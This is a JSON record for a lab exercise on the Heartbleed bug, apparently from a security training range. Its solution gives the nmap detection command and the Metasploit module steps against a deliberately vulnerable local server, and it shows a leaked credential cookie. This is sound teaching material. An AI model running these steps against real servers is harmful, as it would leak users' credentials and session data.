{"description":"Simulation of Heartbleed bug in older versions of libssl","goal":"<p>The goal of this laboratory is to perform a <strong>buffer overread </strong>attack by exploiting the notorious <em><a title=\"Heartbleed\" href=\"https://heartbleed.com/\">Heartbleed</a> </em>bug (<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0160\">CVE-2014-0160</a>).</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://raw.githubusercontent.com/effesociety/heartbleed-vulnerable-server/main/docs/heartbleed-bug-diagram.png\" alt=\"Heartbleed Diagram\" width=\"1090\" height=\"630\" /></p>","solution":"<div>This laboratory provides a Heartbleed vulnerable web server with a simple page that is useful to provide some <strong>juicy</strong> data when exploiting the vulnerability. For this purpose we added a simple form that creates a <strong>cookie</strong> where are stored user credentials. (We know that this is not a real case scenario but it is useful tu understand how informations are stored in the webserver.</div>\n<div>You can access this web server through <a href=\"https://localhost:8443\">this </a>link (<em>https://localhost:8443</em>), of course the website has a <strong>self signed certificate</strong>, so in order to visit it you have to \"<em>Accept the risks</em>\" (if your browser does <strong>NOT</strong> provide this function you can try with anonymous browsing because is possible you will be able in this mode)</div>\n<div>&nbsp;</div>\n<div><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://raw.githubusercontent.com/effesociety/heartbleed-vulnerable-server/main/docs/vulnerable-web-server.jpg\" alt=\"Vulnerable Web Server\" width=\"1200\" height=\"613\" /></div>\n<h2>Check if the vulnerability is there</h2>\n<p>You can use <strong>nmap</strong> to get information about the webserver and get info about the presence of the Heartbleed bug using this command (in order to make things more easy we gave the <strong>fixed IP address 193.20.1.2</strong> to the webserver):</p>\n<p><code>nmap -sV --script=ssl-heartbleed 193.20.1.2</code></p>\n<p>The command will return this result:</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://raw.githubusercontent.com/effesociety/heartbleed-vulnerable-server/main/docs/heartbleed-nmap.jpg\" alt=\"Heartbleed nmap\" width=\"1200\" height=\"475\" /></p>\n<div>The <strong>Heartbleed</strong> vulnerability is there! (Surprised?)</div>\n<h2>Exploit the Heartbleed Bug</h2>\n<p>As we said before we wanna have some <strong>interesting result</strong> from these exploit so you can got the webserver link and fill the <strong>two</strong> <strong>inputs</strong> and click on the <strong>Submit</strong> button. In that page there is a simple script that creates a cookie like this:</p>\n<p><code>username: &lt;username&gt;</code></p>\n<p><code>password: &lt;password&gt;</code></p>\n<p>As we said before no one (we hope!) saves user credentials in the cookie like this, its just for this training session.</p>\n<p>After doing so we can use the Managed Service Kali as an Hack Tool; after attaching it to the network we can exploit the Heartbleed bug.</p>\n<p>In order to do this we will use <strong>Metasploit</strong>, so the first command to run is:</p>\n<p><code>msfconsole</code></p>\n<p>Then you have to type</p>\n<p><code>use auxiliary/scanner/ssl/openssl_heartbleed</code></p>\n<p>and then launch</p>\n<p><code>show options</code></p>\n<p>to see <strong>module options</strong></p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://raw.githubusercontent.com/effesociety/heartbleed-vulnerable-server/main/docs/heartbleed-metasploit-options.jpg\" alt=\"Heartbleed Exploit Options\" width=\"1200\" height=\"415\" /></p>\n<p>We must set two options:</p>\n<p><code>set verbose true</code></p>\n<p><code>set rhosts 193.20.1.2</code></p>\n<p>Finally, type <code>run</code> to execute the exploit</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://raw.githubusercontent.com/effesociety/heartbleed-vulnerable-server/main/docs/heartbleed-info-leaked.jpg\" alt=\"Heartbleed Leak\" width=\"1200\" height=\"240\" /></p>\n<p>As you can see we were able to get the last request made to the webserver containing the <strong>cookie</strong> of an unaware client!</p>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>","readme":"","difficulty":"Medium","author":"NS"}
